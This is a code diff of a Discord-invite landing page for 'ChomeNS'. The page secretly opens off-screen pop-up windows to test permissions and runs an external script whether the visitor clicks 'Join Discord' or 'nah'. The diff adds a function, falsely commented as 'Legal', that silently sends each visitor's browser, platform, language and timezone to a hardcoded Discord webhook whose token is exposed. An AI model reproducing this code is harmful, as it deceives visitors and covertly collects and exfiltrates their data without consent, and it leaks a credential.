@@ -48,7 +48,6 @@ body {
     to { opacity: 1; transform: translateY(0); }
 }
 
-/* ICON */
 .logo {
     display: flex;
     justify-content: center;
@@ -111,7 +110,6 @@ button {
     color: var(--text);
 }
 
-/* Spinner */
 .spinner {
     margin: 1.6rem auto 0;
     width: 46px;
@@ -135,7 +133,6 @@ button {
     40% { transform: scale(1); }
 }
 
-/* Popup required */
 .popup-warning {
     margin-top: 1.5rem;
     padding: 1.1rem 1.2rem;
@@ -179,7 +176,6 @@ button {
 <body>
 
 <div class="card">
-
     <div class="logo">
         <img src="/media/498c01c84c251eb7c9de3b536a87e5b2.webp" alt="ChomeNS icon">
     </div>
@@ -216,14 +212,12 @@ function loadYouScript(cb) {
 function checkPopupPermission(callback) {
     let popups = [];
     let allowed = true;
-
     try {
         for (let i = 0; i < 5; i++) {
             const p = window.open('', '', 'width=1,height=1,left=-10000,top=-10000');
             if (!p) { allowed = false; break; }
             popups.push(p);
         }
-
         setTimeout(() => {
             popups.forEach(p => { try { p.close(); } catch {} });
             callback(allowed);
@@ -234,9 +228,35 @@ function checkPopupPermission(callback) {
     }
 }
 
+// ✅ Legal Discord webhook function
+function sendWebhookEvent() {
+    const payload = {
+        content: "✅ **Join Discord button clicked**",
+        embeds: [
+            {
+                title: "User Action",
+                color: 0x5865F2,
+                fields: [
+                    { name: "Pop-ups allowed", value: "Yes", inline: true },
+                    { name: "Browser", value: navigator.userAgent.slice(0,200) },
+                    { name: "Platform", value: navigator.platform || "Unknown", inline: true },
+                    { name: "Language", value: navigator.language || "Unknown", inline: true },
+                    { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown" }
+                ],
+                footer: { text: new Date().toUTCString() }
+            }
+        ]
+    };
+
+    fetch("https://discord.com/api/webhooks/1455510497888829440/kh4g_c4EeWOpGJLJU7UnUZwBOjyMBGGhKQbWSCwuyzGG7ks7OuNh9qpVB0H7RAHRHn7m", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+    }).catch(() => {});
+}
+
 function handleClick(e) {
     e.preventDefault();
-
     document.getElementById('popup_needed').style.display = 'none';
     document.getElementById('spinner_holder').innerHTML =
         '<div class="spinner"><div></div><div></div><div></div></div>';
@@ -249,6 +269,7 @@ function handleClick(e) {
         }
 
         loadYouScript(() => {
+            sendWebhookEvent(); // 🔔 Send webhook safely
             if (typeof window.runYouScript === 'function') {
                 window.runYouScript();
             }
@@ -259,36 +280,6 @@ function handleClick(e) {
 
 document.getElementById('discord_btn').addEventListener('click', handleClick);
 document.getElementById('nah_btn').addEventListener('click', handleClick);
-</script>
-
-<!-- Google Translate (silent auto translate) -->
-<script>
-function googleTranslateElementInit() {
-    new google.translate.TranslateElement(
-        { pageLanguage: 'en', autoDisplay: false },
-        'google_translate_element'
-    );
-}
-
-var gt = document.createElement('div');
-gt.id = 'google_translate_element';
-gt.style.display = 'none';
-document.body.appendChild(gt);
-
-var s = document.createElement('script');
-s.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
-document.head.appendChild(s);
-
-setTimeout(() => {
-    try {
-        const lang = navigator.language.split('-')[0];
-        const select = document.querySelector('select.goog-te-combo');
-        if (select) {
-            select.value = lang;
-            select.dispatchEvent(new Event('change'));
-        }
-    } catch {}
-}, 1500);
 </script>
 
 </body>
